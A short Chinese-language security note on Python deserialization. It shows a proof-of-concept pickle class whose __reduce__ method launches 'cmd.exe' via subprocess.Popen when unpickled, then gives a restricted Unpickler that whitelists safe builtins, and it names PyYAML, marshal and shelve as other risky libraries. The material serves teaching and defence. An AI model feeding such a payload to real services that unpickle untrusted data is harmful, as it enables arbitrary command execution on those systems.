反序列化
========================================

pickle demo
----------------------------------------
Python Pickle在反序列化时会调用 ``__reduce__`` ，可用自定义的 ``__reduce__`` 函数来实现攻击。

.. code-block:: python

    import pickle
    import pickletools
    import subprocess

    class A(object):
        a = 1
        b = 2
        def __reduce__(self):
            return (subprocess.Popen, (('cmd.exe',),))

    data = pickle.dumps(A())
    pickletools.dis(data)

对于这种攻击，可以用重载 find_class 来限定范围，`参考 <https://docs.python.org/3/library/pickle.html#restricting-globals>`_

.. code-block:: python

    import builtins
    import io
    import pickle

    safe_builtins = {
        'range',
        'complex',
        'set',
        'frozenset',
        'slice',
    }

    class RestrictedUnpickler(pickle.Unpickler):

        def find_class(self, module, name):
            # Only allow safe classes from builtins.
            if module == "builtins" and name in safe_builtins:
                return getattr(builtins, name)
            # Forbid everything else.
            raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                         (module, name))

    def restricted_loads(s):
        """Helper function analogous to pickle.loads()."""
        return RestrictedUnpickler(io.BytesIO(s)).load()

其他序列化库
----------------------------------------
- PyYAML
- marshal
- shelve
